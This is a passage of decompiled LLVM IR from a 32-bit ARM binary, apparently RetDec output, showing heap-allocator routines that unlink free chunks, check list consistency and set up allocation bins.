  store i32 %v3_107e0, i32* %r3.global-to-local, align 4
  %v1_107e4 = urem i32 %v3_107e0, 2
  %v2_107e4 = icmp eq i32 %v1_107e4, 0
  %v2_107e8 = add i32 %v1_107e8, 4
  %v3_107e8 = inttoptr i32 %v2_107e8 to i32*
  store i32 %v1_107d4, i32* %v3_107e8, align 4
  br i1 %v2_107e4, label %dec_label_pc_107f0, label %dec_label_pc_107dc.dec_label_pc_10820_crit_edge

dec_label_pc_107dc.dec_label_pc_10820_crit_edge:  ; preds = %dec_label_pc_107dc
  %v0_10824.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10820

dec_label_pc_107f0:                               ; preds = %dec_label_pc_107dc
  %v0_107f0 = load i32, i32* @r0, align 4
  %v1_107f0 = add i32 %v0_107f0, 8
  %v2_107f0 = inttoptr i32 %v1_107f0 to i32*
  %v3_107f0 = load i32, i32* %v2_107f0, align 4
  store i32 %v3_107f0, i32* %ip.global-to-local, align 4
  %v1_107f4 = add i32 %v3_107f0, 12
  %v2_107f4 = inttoptr i32 %v1_107f4 to i32*
  %v3_107f4 = load i32, i32* %v2_107f4, align 4
  store i32 %v3_107f4, i32* %r3.global-to-local, align 4
  %v9_107f8 = icmp eq i32 %v3_107f4, %v0_107f0
  %v1_107fc = add i32 %v0_107f0, 12
  %v2_107fc = inttoptr i32 %v1_107fc to i32*
  %v3_107fc = load i32, i32* %v2_107fc, align 4
  store i32 %v3_107fc, i32* %r2.global-to-local, align 4
  br i1 %v9_107f8, label %dec_label_pc_10804, label %dec_label_pc_10810

dec_label_pc_10804:                               ; preds = %dec_label_pc_107f0
  %v1_10804 = add i32 %v3_107fc, 8
  %v2_10804 = inttoptr i32 %v1_10804 to i32*
  %v3_10804 = load i32, i32* %v2_10804, align 4
  store i32 %v3_10804, i32* %r3.global-to-local, align 4
  %v9_10808 = icmp eq i32 %v3_10804, %v0_107f0
  br i1 %v9_10808, label %dec_label_pc_10814, label %dec_label_pc_10810

dec_label_pc_10810:                               ; preds = %dec_label_pc_107f0, %dec_label_pc_107b4, %dec_label_pc_10798, %dec_label_pc_10804
  %v0_10810 = call i32 @function_10b60()
  store i32 %v0_10810, i32* @r0, align 4
  %v0_10814.pre = load i32, i32* @ip, align 4
  %v1_10814.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_10814

dec_label_pc_10814:                               ; preds = %dec_label_pc_10804, %dec_label_pc_10810
  %v1_10814 = phi i32 [ %v3_107fc, %dec_label_pc_10804 ], [ %v1_10814.pre, %dec_label_pc_10810 ]
  %v0_10814 = phi i32 [ %v3_107f0, %dec_label_pc_10804 ], [ %v0_10814.pre, %dec_label_pc_10810 ]
  %v2_10814 = add i32 %v1_10814, 8
  %v3_10814 = inttoptr i32 %v2_10814 to i32*
  store i32 %v0_10814, i32* %v3_10814, align 4
  %v0_10818 = load i32, i32* %r2.global-to-local, align 4
  %v1_10818 = load i32, i32* %ip.global-to-local, align 4
  %v2_10818 = add i32 %v1_10818, 12
  %v3_10818 = inttoptr i32 %v2_10818 to i32*
  store i32 %v0_10818, i32* %v3_10818, align 4
  %v0_1081c = load i32, i32* %lr.global-to-local, align 4
  %v1_1081c = load i32, i32* %r5.global-to-local, align 4
  %v2_1081c = add i32 %v1_1081c, %v0_1081c
  store i32 %v2_1081c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10820

dec_label_pc_10820:                               ; preds = %dec_label_pc_107dc.dec_label_pc_10820_crit_edge, %dec_label_pc_10814
  %v0_10824 = phi i32 [ %v0_10824.pre, %dec_label_pc_107dc.dec_label_pc_10820_crit_edge ], [ %v2_1081c, %dec_label_pc_10814 ]
  %v0_10820 = load i32, i32* %r7.global-to-local, align 4
  %v1_10820 = add i32 %v0_10820, 8
  %v2_10820 = inttoptr i32 %v1_10820 to i32*
  %v3_10820 = load i32, i32* %v2_10820, align 4
  store i32 %v3_10820, i32* %r2.global-to-local, align 4
  %v1_10824 = or i32 %v0_10824, 1
  store i32 %v1_10824, i32* %r3.global-to-local, align 4
  %v0_10828 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10828, i32* %v2_10820, align 4
  %v0_1082c = load i32, i32* %r1.global-to-local, align 4
  %v1_1082c = load i32, i32* %r2.global-to-local, align 4
  %v2_1082c = add i32 %v1_1082c, 12
  %v3_1082c = inttoptr i32 %v2_1082c to i32*
  store i32 %v0_1082c, i32* %v3_1082c, align 4
  %v0_10830 = load i32, i32* %lr.global-to-local, align 4
  %v1_10830 = load i32, i32* %r1.global-to-local, align 4
  %v3_10830 = add i32 %v1_10830, %v0_10830
  %v4_10830 = inttoptr i32 %v3_10830 to i32*
  store i32 %v0_10830, i32* %v4_10830, align 4
  %v0_10834 = load i32, i32* %r3.global-to-local, align 4
  %v1_10834 = load i32, i32* %r1.global-to-local, align 4
  %v2_10834 = add i32 %v1_10834, 4
  %v3_10834 = inttoptr i32 %v2_10834 to i32*
  store i32 %v0_10834, i32* %v3_10834, align 4
  %v0_10838 = load i32, i32* %r2.global-to-local, align 4
  %v1_10838 = load i32, i32* %r1.global-to-local, align 4
  %v2_10838 = add i32 %v1_10838, 8
  %v3_10838 = inttoptr i32 %v2_10838 to i32*
  store i32 %v0_10838, i32* %v3_10838, align 4
  %v0_1083c = load i32, i32* %r7.global-to-local, align 4
  %v1_1083c = load i32, i32* %r1.global-to-local, align 4
  %v2_1083c = add i32 %v1_1083c, 12
  %v3_1083c = inttoptr i32 %v2_1083c to i32*
  store i32 %v0_1083c, i32* %v3_1083c, align 4
  br label %dec_label_pc_10854

dec_label_pc_10844:                               ; preds = %dec_label_pc_107cc
  %v2_10844 = add i32 %v1_107d4, %v0_10844
  %v1_10848 = or i32 %v2_10844, 1
  store i32 %v1_10848, i32* %r3.global-to-local, align 4
  %v1_1084c = load i32, i32* %r1.global-to-local, align 4
  %v2_1084c = add i32 %v1_1084c, 4
  %v3_1084c = inttoptr i32 %v2_1084c to i32*
  store i32 %v1_10848, i32* %v3_1084c, align 4
  %v0_10850 = load i32, i32* %r1.global-to-local, align 4
  %v1_10850 = load i32, i32* @r4, align 4
  %v2_10850 = add i32 %v1_10850, 44
  %v3_10850 = inttoptr i32 %v2_10850 to i32*
  store i32 %v0_10850, i32* %v3_10850, align 4
  br label %dec_label_pc_10854

dec_label_pc_10854:                               ; preds = %dec_label_pc_10820, %dec_label_pc_10844
  %v0_10854 = load i32, i32* %sl.global-to-local, align 4
  %v2_10854 = icmp eq i32 %v0_10854, 0
  store i32 %v0_10854, i32* %r1.global-to-local, align 4
  br i1 %v2_10854, label %dec_label_pc_10860.loopexit, label %dec_label_pc_1077c

dec_label_pc_10860.loopexit:                      ; preds = %dec_label_pc_10854
  %v0_10860.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_10860.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10860

dec_label_pc_10860:                               ; preds = %dec_label_pc_10860.loopexit, %dec_label_pc_1076c
  %v1_10860 = phi i32 [ %v1_10860.pre, %dec_label_pc_10860.loopexit ], [ %v1_1086010, %dec_label_pc_1076c ]
  %v0_10868 = phi i32 [ %v0_10860.pre, %dec_label_pc_10860.loopexit ], [ %v1_10778, %dec_label_pc_1076c ]
  %v9_10860 = icmp eq i32 %v0_10868, %v1_10860
  br i1 %v9_10860, label %dec_label_pc_108d8, label %dec_label_pc_10868

dec_label_pc_10868:                               ; preds = %dec_label_pc_10860
  %v1_10868 = add i32 %v0_10868, 4
  store i32 %v1_10868, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1076c

dec_label_pc_10870.dec_label_pc_10870_crit_edge:  ; preds = %dec_label_pc_10870.preheader, %dec_label_pc_10870.dec_label_pc_10870_crit_edge
  %v0_10870.pre = load i32, i32* @r4, align 4
  %v1_10870.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_10870 = mul i32 %v1_10870.pre, 8
  %v5_10870 = add i32 %v4_10870, %v0_10870.pre
  %v1_10874 = add i32 %v1_10870.pre, 1
  store i32 %v1_10874, i32* %r2.global-to-local, align 4
  %v1_10878 = add i32 %v5_10870, 44
  store i32 %v1_10878, i32* %r3.global-to-local, align 4
  %v2_10880 = add i32 %v5_10870, 52
  %v3_10880 = inttoptr i32 %v2_10880 to i32*
  store i32 %v1_10878, i32* %v3_10880, align 4
  %v0_10884 = load i32, i32* %r3.global-to-local, align 4
  %v2_10884 = add i32 %v0_10884, 12
  %v3_10884 = inttoptr i32 %v2_10884 to i32*
  store i32 %v0_10884, i32* %v3_10884, align 4
  %v7_10888 = icmp sgt i32 %v1_10874, 95
  br i1 %v7_10888, label %dec_label_pc_1088c, label %dec_label_pc_10870.dec_label_pc_10870_crit_edge

dec_label_pc_1088c:                               ; preds = %dec_label_pc_10870.dec_label_pc_10870_crit_edge
  %v0_1088c = load i32, i32* @r4, align 4
  %v1_1088c = inttoptr i32 %v0_1088c to i32*
  %v2_1088c = load i32, i32* %v1_1088c, align 4
  store i32 %v2_1088c, i32* %r2.global-to-local, align 4
  %v1_10890 = add i32 %v0_1088c, 864
  %v2_10890 = inttoptr i32 %v1_10890 to i32*
  %v3_10890 = load i32, i32* %v2_10890, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10898 = urem i32 %v2_1088c, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_108a0 = or i32 %v3_10890, 1
  store i32 %v1_108a0, i32* %r1.global-to-local, align 4
  %v1_108a4 = or i32 %v1_10898, 72
  store i32 %v1_108a4, i32* %r2.global-to-local, align 4
  %v1_108a8 = add i32 %v0_1088c, 52
  store i32 %v1_108a8, i32* %ip.global-to-local, align 4
  %v2_108ac = add i32 %v0_1088c, 840
  %v3_108ac = inttoptr i32 %v2_108ac to i32*
  store i32 0, i32* %v3_108ac, align 4
  %v0_108b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_108b0 = add i32 %v0_108b0, 65536
  store i32 %v1_108b0, i32* %r3.global-to-local, align 4
  %v0_108b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_108b4 = load i32, i32* @r4, align 4
  %v2_108b4 = add i32 %v1_108b4, 836
  %v3_108b4 = inttoptr i32 %v2_108b4 to i32*
  store i32 %v0_108b4, i32* %v3_108b4, align 4
  %v0_108b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_108b8 = load i32, i32* @r4, align 4
  %v2_108b8 = add i32 %v1_108b8, 844
  %v3_108b8 = inttoptr i32 %v2_108b8 to i32*
  store i32 %v0_108b8, i32* %v3_108b8, align 4
  %v1_108bc = load i32, i32* @r4, align 4
  %v2_108bc = add i32 %v1_108bc, 852
  %v3_108bc = inttoptr i32 %v2_108bc to i32*
  store i32 %v1_108b0, i32* %v3_108bc, align 4
  %v1_108c0 = load i32, i32* @r4, align 4
  %v2_108c0 = add i32 %v1_108c0, 864
  %v3_108c0 = inttoptr i32 %v2_108c0 to i32*
  store i32 %v1_108a0, i32* %v3_108c0, align 4
  %v1_108c4 = load i32, i32* @r4, align 4
  %v2_108c4 = inttoptr i32 %v1_108c4 to i32*
  store i32 %v1_108a4, i32* %v2_108c4, align 4
  %v0_108c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_108c8 = load i32, i32* @r4, align 4
  %v2_108c8 = add i32 %v1_108c8, 44
  %v3_108c8 = inttoptr i32 %v2_108c8 to i32*
  store i32 %v0_108c8, i32* %v3_108c8, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_108d0 = call i32 @function_1173c(i32 30, i32 %v1_108a0, i32 %v1_108a4, i32 %v1_108b0)
  store i32 %v4_108d0, i32* @r0, align 4
  %v1_108d4 = load i32, i32* @r4, align 4
  %v2_108d4 = add i32 %v1_108d4, 860
  %v3_108d4 = inttoptr i32 %v2_108d4 to i32*
  store i32 %v4_108d0, i32* %v3_108d4, align 4
  br label %dec_label_pc_108d8

dec_label_pc_108d8:                               ; preds = %dec_label_pc_10860, %dec_label_pc_1088c
  %v2_108dc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_108dc, i32* @r4, align 4
  %v1_108e0 = load i32, i32* @r0, align 4
  ret i32 %v1_108e0

; uselistorder directives
  uselistorder i32 %v0_1088c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10884, { 1, 0 }
  uselistorder i32 %v1_10868, { 1, 0 }
  uselistorder i32 %v0_10854, { 0, 2, 1 }
  uselistorder i32 %v0_10830, { 1, 0 }
  uselistorder i32 %v1_10780, { 1, 0, 2 }
  uselistorder i32 %v0_10798, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_10758, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder label %dec_label_pc_108d8, { 1, 0 }
  uselistorder label %dec_label_pc_10870.dec_label_pc_10870_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10854, { 1, 0 }
  uselistorder label %dec_label_pc_10820, { 1, 0 }
  uselistorder label %dec_label_pc_10814, { 1, 0 }
  uselistorder label %dec_label_pc_10810, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_107cc, { 1, 0 }
}

define i32 @function_108e4() local_unnamed_addr {
dec_label_pc_108e4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_108e4 = load i32, i32* @r4, align 4
  %v6_108e4 = load i32, i32* @r5, align 4
  %v9_108e4 = load i32, i32* @r6, align 4
  %v12_108e4 = load i32, i32* @r7, align 4
  %v18_108e4 = load i32, i32* @lr, align 4
  %v0_108ec = load i32, i32* @r0, align 4
  store i32 %v0_108ec, i32* @r6, align 4
  %v2_108ec = icmp eq i32 %v0_108ec, 0
  %v2_108f0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 142044, i32* @r7, align 4
  br i1 %v2_108ec, label %dec_label_pc_10af8, label %dec_label_pc_108fc

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108e4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_10900 = load i32, i32* inttoptr (i32 142116 to i32*), align 4
  store i32 %v4_10900, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_10900, i32* %r2.global-to-local, align 4
  %v4_1090c = load i32, i32* inttoptr (i32 142080 to i32*), align 256
  store i32 %v4_1090c, i32* %r1.global-to-local, align 4
  store i32 %v2_108f0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_10918 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  store i32 %v4_10918, i32* %ip.global-to-local, align 4
  store i32 67876, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_10918)
  %v0_10924 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10924, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1092c = load i32, i32* @r7, align 4
  %v2_1092c = add i32 %v0_1092c, 16
  %v3_1092c = inttoptr i32 %v2_1092c to i32*
  %v4_1092c = load i32, i32* %v3_1092c, align 4
  store i32 %v4_1092c, i32* %ip.global-to-local, align 4
  store i32 67896, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1092c)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_1093c = load i32, i32* @r7, align 4
  %v2_1093c = add i32 %v0_1093c, 32
  %v3_1093c = inttoptr i32 %v2_1093c to i32*
  %v4_1093c = load i32, i32* %v3_1093c, align 4
  store i32 %v4_1093c, i32* @lr, align 4
  %v0_10940 = load i32, i32* @r6, align 4
  %v1_10940 = add i32 %v0_10940, -4
  %v2_10940 = inttoptr i32 %v1_10940 to i32*
  %v3_10940 = load i32, i32* %v2_10940, align 4
  store i32 %v3_10940, i32* %r2.global-to-local, align 4
  %v1_10944 = inttoptr i32 %v4_1093c to i32*
  %v2_10944 = load i32, i32* %v1_10944, align 4
  store i32 %v2_10944, i32* %r3.global-to-local, align 4
  %v1_10948 = and i32 %v3_10940, -4
  store i32 %v1_10948, i32* %ip.global-to-local, align 4
  %v1_1094c = add i32 %v0_10940, -8
  store i32 %v1_1094c, i32* @r5, align 4
  store i32 %v1_1094c, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_10948, %v2_10944
  br i1 %tmp, label %dec_label_pc_1097c, label %dec_label_pc_1095c

dec_label_pc_1095c:                               ; preds = %dec_label_pc_108fc
  %v1_1095c = or i32 %v2_10944, 3
  store i32 %v1_1095c, i32* %r3.global-to-local, align 4
  store i32 %v1_1095c, i32* %v1_10944, align 4
  %v3_10960 = load i32, i32* @lr, align 4
  %v4_10960 = add i32 %v3_10960, -8
  store i32 %v4_10960, i32* %lr.global-to-local, align 4
  %v0_10964 = load i32, i32* %ip.global-to-local, align 4
  %v3_10964 = udiv i32 %v0_10964, 8
  store i32 %v3_10964, i32* %r1.global-to-local, align 4
  %v1_10968 = add i32 %v3_10960, -4
  store i32 %v1_10968, i32* %r2.global-to-local, align 4
  %v4_1096c = mul nuw i32 %v3_10964, 4
  %v5_1096c = add i32 %v4_1096c, %v1_10968
  %v6_1096c = inttoptr i32 %v5_1096c to i32*
  %v7_1096c = load i32, i32* %v6_1096c, align 4
  store i32 %v7_1096c, i32* %r3.global-to-local, align 4
  %v1_10970 = load i32, i32* @r5, align 4
  %v2_10970 = add i32 %v1_10970, 8
  %v3_10970 = inttoptr i32 %v2_10970 to i32*
  store i32 %v7_1096c, i32* %v3_10970, align 4
  %v0_10974 = load i32, i32* @r5, align 4
  %v1_10974 = load i32, i32* %r2.global-to-local, align 4
  %v2_10974 = load i32, i32* %r1.global-to-local, align 4
  %v5_10974 = mul i32 %v2_10974, 4
  %v6_10974 = add i32 %v5_10974, %v1_10974
  %v7_10974 = inttoptr i32 %v6_10974 to i32*
  store i32 %v0_10974, i32* %v7_10974, align 4
  br label %dec_label_pc_10ae0

dec_label_pc_1097c:                               ; preds = %dec_label_pc_108fc
  %v1_1097c = and i32 %v3_10940, 2
  %v2_1097c = icmp eq i32 %v1_1097c, 0
  br i1 %v2_1097c, label %dec_label_pc_10984, label %dec_label_pc_10ab8

dec_label_pc_10984:                               ; preds = %dec_label_pc_1097c
  %v1_10984 = or i32 %v2_10944, 1
  store i32 %v1_10984, i32* %r3.global-to-local, align 4
  store i32 %v1_10984, i32* %v1_10944, align 4
  %v0_1098c = load i32, i32* @r6, align 4
  %v1_1098c = add i32 %v0_1098c, -4
  %v2_1098c = inttoptr i32 %v1_1098c to i32*
  %v3_1098c = load i32, i32* %v2_1098c, align 4
  store i32 %v3_1098c, i32* %r3.global-to-local, align 4
  %v0_10990 = load i32, i32* @r5, align 4
  %v1_10990 = load i32, i32* %ip.global-to-local, align 4
  %v2_10990 = add i32 %v1_10990, %v0_10990
  store i32 %v2_10990, i32* %lr.global-to-local, align 4
  %v1_10994 = urem i32 %v3_1098c, 2
  %v2_10994 = icmp eq i32 %v1_10994, 0
  %v1_10998 = add i32 %v2_10990, 4
  %v2_10998 = inttoptr i32 %v1_10998 to i32*
  %v3_10998 = load i32, i32* %v2_10998, align 4
  store i32 %v3_10998, i32* %r8.global-to-local, align 4
  br i1 %v2_10994, label %dec_label_pc_109a0, label %dec_label_pc_109d4

dec_label_pc_109a0:                               ; preds = %dec_label_pc_10984
  %v1_109a0 = add i32 %v0_1098c, -8
  %v2_109a0 = inttoptr i32 %v1_109a0 to i32*
  %v3_109a0 = load i32, i32* %v2_109a0, align 4
  store i32 %v3_109a0, i32* %r1.global-to-local, align 4
  %v2_109a4 = sub i32 %v0_10990, %v3_109a0
  store i32 %v2_109a4, i32* %r3.global-to-local, align 4
  %v1_109a8 = add i32 %v2_109a4, 8
  %v2_109a8 = inttoptr i32 %v1_109a8 to i32*
  %v3_109a8 = load i32, i32* %v2_109a8, align 4
  store i32 %v3_109a8, i32* %r2.global-to-local, align 4
  %v1_109ac = add i32 %v3_109a8, 12
  %v2_109ac = inttoptr i32 %v1_109ac to i32*
  %v3_109ac = load i32, i32* %v2_109ac, align 4
  store i32 %v3_109ac, i32* %r4.global-to-local, align 4
  %v9_109b0 = icmp eq i32 %v3_109ac, %v2_109a4
  %v1_109b4 = add i32 %v2_109a4, 12
  %v2_109b4 = inttoptr i32 %v1_109b4 to i32*
  %v3_109b4 = load i32, i32* %v2_109b4, align 4
  store i32 %v3_109b4, i32* %r0.global-to-local, align 4
  br i1 %v9_109b0, label %dec_label_pc_109bc, label %dec_label_pc_10a20

dec_label_pc_109bc:                               ; preds = %dec_label_pc_109a0
  %v1_109bc = add i32 %v3_109b4, 8
  %v2_109bc = inttoptr i32 %v1_109bc to i32*
  %v3_109bc = load i32, i32* %v2_109bc, align 4
  store i32 %v3_109bc, i32* %r3.global-to-local, align 4
  %v9_109c0 = icmp eq i32 %v3_109bc, %v2_109a4
  br i1 %v9_109c0, label %dec_label_pc_109c8, label %dec_label_pc_10a20

dec_label_pc_109c8:                               ; preds = %dec_label_pc_109bc
  store i32 %v3_109a8, i32* %v2_109bc, align 4
  %v0_109cc = load i32, i32* %r0.global-to-local, align 4
  %v1_109cc = load i32, i32* %r2.global-to-local, align 4
  %v2_109cc = add i32 %v1_109cc, 12
  %v3_109cc = inttoptr i32 %v2_109cc to i32*
  store i32 %v0_109cc, i32* %v3_109cc, align 4
  %v0_109d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_109d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_109d0 = add i32 %v1_109d0, %v0_109d0
  store i32 %v2_109d0, i32* %ip.global-to-local, align 4
  %v0_109e0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_109e4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_109d4

dec_label_pc_109d4:                               ; preds = %dec_label_pc_10984, %dec_label_pc_109c8
  %v0_10a60 = phi i32 [ %v1_10990, %dec_label_pc_10984 ], [ %v2_109d0, %dec_label_pc_109c8 ]
  %v0_109e4 = phi i32 [ %v3_10998, %dec_label_pc_10984 ], [ %v0_109e4.pre, %dec_label_pc_109c8 ]
  %v1_109f8 = phi i32 [ %v2_10990, %dec_label_pc_10984 ], [ %v0_109e0.pre, %dec_label_pc_109c8 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_109d8 = load i32, i32* @r7, align 4
  %v2_109d8 = add i32 %v0_109d8, 32
  %v3_109d8 = inttoptr i32 %v2_109d8 to i32*
  %v4_109d8 = load i32, i32* %v3_109d8, align 4
  store i32 %v4_109d8, i32* %r2.global-to-local, align 4
  %v1_109dc = add i32 %v4_109d8, 44
  %v2_109dc = inttoptr i32 %v1_109dc to i32*
  %v3_109dc = load i32, i32* %v2_109dc, align 4
  store i32 %v3_109dc, i32* %r3.global-to-local, align 4
  %v9_109e0 = icmp eq i32 %v1_109f8, %v3_109dc
  %v1_109e4 = and i32 %v0_109e4, -4
  store i32 %v1_109e4, i32* %r0.global-to-local, align 4
  br i1 %v9_109e0, label %dec_label_pc_10a60, label %dec_label_pc_109ec

dec_label_pc_109ec:                               ; preds = %dec_label_pc_109d4
  %v2_109ec = add i32 %v1_109f8, %v1_109e4
  store i32 %v2_109ec, i32* %r3.global-to-local, align 4
  %v1_109f0 = add i32 %v2_109ec, 4
  %v2_109f0 = inttoptr i32 %v1_109f0 to i32*
  %v3_109f0 = load i32, i32* %v2_109f0, align 4
  store i32 %v3_109f0, i32* %r3.global-to-local, align 4
  %v1_109f4 = urem i32 %v3_109f0, 2
  %v2_109f4 = icmp eq i32 %v1_109f4, 0
  %v2_109f8 = add i32 %v1_109f8, 4
  %v3_109f8 = inttoptr i32 %v2_109f8 to i32*
  store i32 %v1_109e4, i32* %v3_109f8, align 4
  br i1 %v2_109f4, label %dec_label_pc_10a00, label %dec_label_pc_109ec.dec_label_pc_10a30_crit_edge

dec_label_pc_109ec.dec_label_pc_10a30_crit_edge:  ; preds = %dec_label_pc_109ec
  %v0_10a40.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10a30

dec_label_pc_10a00:                               ; preds = %dec_label_pc_109ec
  %v0_10a00 = load i32, i32* %lr.global-to-local, align 4
  %v1_10a00 = add i32 %v0_10a00, 8
  %v2_10a00 = inttoptr i32 %v1_10a00 to i32*
  %v3_10a00 = load i32, i32* %v2_10a00, align 4
  store i32 %v3_10a00, i32* %r1.global-to-local, align 4
  %v1_10a04 = add i32 %v3_10a00, 12
  %v2_10a04 = inttoptr i32 %v1_10a04 to i32*
  %v3_10a04 = load i32, i32* %v2_10a04, align 4
  store i32 %v3_10a04, i32* %r3.global-to-local, align 4
  %v9_10a08 = icmp eq i32 %v3_10a04, %v0_10a00
  %v1_10a0c = add i32 %v0_10a00, 12
  %v2_10a0c = inttoptr i32 %v1_10a0c to i32*
  %v3_10a0c = load i32, i32* %v2_10a0c, align 4
  store i32 %v3_10a0c, i32* %r2.global-to-local, align 4
  br i1 %v9_10a08, label %dec_label_pc_10a14, label %dec_label_pc_10a20

dec_label_pc_10a14:                               ; preds = %dec_label_pc_10a00
  %v1_10a14 = add i32 %v3_10a0c, 8
  %v2_10a14 = inttoptr i32 %v1_10a14 to i32*
  %v3_10a14 = load i32, i32* %v2_10a14, align 4
  store i32 %v3_10a14, i32* %r3.global-to-local, align 4
  %v9_10a18 = icmp eq i32 %v3_10a14, %v0_10a00
  br i1 %v9_10a18, label %dec_label_pc_10a24, label %dec_label_pc_10a20

dec_label_pc_10a20:                               ; preds = %dec_label_pc_10a00, %dec_label_pc_109bc, %dec_label_pc_109a0, %dec_label_pc_10a14
  %v0_10a20 = call i32 @function_10b60()
  store i32 %v0_10a20, i32* %r0.global-to-local, align 4
  %v0_10a24.pre = load i32, i32* @r1, align 4
  %v1_10a24.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_10a24

dec_label_pc_10a24:                               ; preds = %dec_label_pc_10a14, %dec_label_pc_10a20
  %v1_10a24 = phi i32 [ %v3_10a0c, %dec_label_pc_10a14 ], [ %v1_10a24.pre, %dec_label_pc_10a20 ]
  %v0_10a24 = phi i32 [ %v3_10a00, %dec_label_pc_10a14 ], [ %v0_10a24.pre, %dec_label_pc_10a20 ]
  %v2_10a24 = add i32 %v1_10a24, 8
  %v3_10a24 = inttoptr i32 %v2_10a24 to i32*
  store i32 %v0_10a24, i32* %v3_10a24, align 4
  %v0_10a28 = load i32, i32* %r2.global-to-local, align 4
  %v1_10a28 = load i32, i32* %r1.global-to-local, align 4
  %v2_10a28 = add i32 %v1_10a28, 12
  %v3_10a28 = inttoptr i32 %v2_10a28 to i32*
  store i32 %v0_10a28, i32* %v3_10a28, align 4
  %v0_10a2c = load i32, i32* %ip.global-to-local, align 4
  %v1_10a2c = load i32, i32* %r0.global-to-local, align 4
  %v2_10a2c = add i32 %v1_10a2c, %v0_10a2c
  store i32 %v2_10a2c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10a30

dec_label_pc_10a30:                               ; preds = %dec_label_pc_109ec.dec_label_pc_10a30_crit_edge, %dec_label_pc_10a24
  %v0_10a40 = phi i32 [ %v0_10a40.pre, %dec_label_pc_109ec.dec_label_pc_10a30_crit_edge ], [ %v2_10a2c, %dec_label_pc_10a24 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_10a34 = load i32, i32* @r7, align 4
  %v2_10a34 = add i32 %v0_10a34, 32
  %v3_10a34 = inttoptr i32 %v2_10a34 to i32*
  %v4_10a34 = load i32, i32* %v3_10a34, align 4
  %v1_10a38 = add i32 %v4_10a34, 52
  store i32 %v1_10a38, i32* %r3.global-to-local, align 4
  %v1_10a3c = add i32 %v4_10a34, 60
  %v2_10a3c = inttoptr i32 %v1_10a3c to i32*
  %v3_10a3c = load i32, i32* %v2_10a3c, align 4
  store i32 %v3_10a3c, i32* %r1.global-to-local, align 4
  %v1_10a40 = or i32 %v0_10a40, 1
  store i32 %v1_10a40, i32* %r2.global-to-local, align 4
  %v1_10a44 = load i32, i32* %r4.global-to-local, align 4
  %v2_10a44 = add i32 %v1_10a44, 12
  %v3_10a44 = inttoptr i32 %v2_10a44 to i32*
  store i32 %v1_10a38, i32* %v3_10a44, align 4
  %v0_10a48 = load i32, i32* %r1.global-to-local, align 4
  %v1_10a48 = load i32, i32* %r4.global-to-local, align 4
  %v2_10a48 = add i32 %v1_10a48, 8
  %v3_10a48 = inttoptr i32 %v2_10a48 to i32*
  store i32 %v0_10a48, i32* %v3_10a48, align 4
  %v0_10a4c = load i32, i32* %r2.global-to-local, align 4
  %v1_10a4c = load i32, i32* %r4.global-to-local, align 4
  %v2_10a4c = add i32 %v1_10a4c, 4
  %v3_10a4c = inttoptr i32 %v2_10a4c to i32*
  store i32 %v0_10a4c, i32* %v3_10a4c, align 4
  %v0_10a50 = load i32, i32* %ip.global-to-local, align 4
  %v1_10a50 = load i32, i32* %r4.global-to-local, align 4
  %v3_10a50 = add i32 %v1_10a50, %v0_10a50
  %v4_10a50 = inttoptr i32 %v3_10a50 to i32*
  store i32 %v0_10a50, i32* %v4_10a50, align 4
  %v0_10a54 = load i32, i32* %r4.global-to-local, align 4
